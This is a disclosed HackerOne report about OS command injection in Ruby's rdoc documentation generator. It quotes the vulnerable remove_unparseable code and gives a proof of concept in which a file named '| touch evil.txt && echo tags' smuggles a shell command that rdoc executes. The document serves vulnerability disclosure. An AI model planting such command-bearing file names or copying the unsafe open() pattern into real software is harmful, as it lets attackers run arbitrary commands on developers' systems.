---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1161691'
original_report_id: '1161691'
title: OS Command Injection in 'rdoc' documentation generator
weakness: OS Command Injection
team_handle: ruby
created_at: '2021-04-12T16:47:15.688Z'
disclosed_at: '2021-07-13T07:38:03.945Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# OS Command Injection in 'rdoc' documentation generator

## Metadata

- HackerOne Report ID: 1161691
- Weakness: OS Command Injection
- Program: ruby
- Disclosed At: 2021-07-13T07:38:03.945Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Details:
If the `remove_unparseable` function  receives a list of files with a command in the name of one of them, it will be executed.
Just enough the name to match the pattern. The problem code:
```ruby
  def remove_unparseable files
    files.reject do |file, *|
      file =~ /\.(?:class|eps|erb|scpt\.txt|svg|ttf|yml)$/i or
        (file =~ /tags$/i and
         open(file, 'rb') { |io|
           io.read(100) =~ /\A(\f\n[^,]+,\d+$|!_TAG_)/
         })
    end
  end
```


# PoC

```bash
$ touch '| touch evil.txt && echo tags'
$ ls
'| touch evil.txt && echo tags'
$ rdoc --all
Parsing sources...
100% [ 1/ 1]  | touch evil.txt && echo tags

Generating Darkfish format into /home/tmp/doc...

  Files:      1

  Classes:    0 (0 undocumented)
  Modules:    0 (0 undocumented)
  Constants:  0 (0 undocumented)
  Attributes: 0 (0 undocumented)
  Methods:    0 (0 undocumented)

  Total:      0 (0 undocumented)
    0.00% documented

  Elapsed: 0.1s

$ ls
doc   evil.txt  '| touch evil.txt && echo tags'
```

I set to the vulnerability the same severity as in https://hackerone.com/reports/651518, since rdoc is widely used on dev/production systems and, therefore, the attack also has a wide range of applications.  An attacker can hide a bad-named-file deep in the project structure to be stealthy some time.

## Impact

An attacker can leverage this weakness to execute arbitrary commands, disclose sensitive information and cause denial of service.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
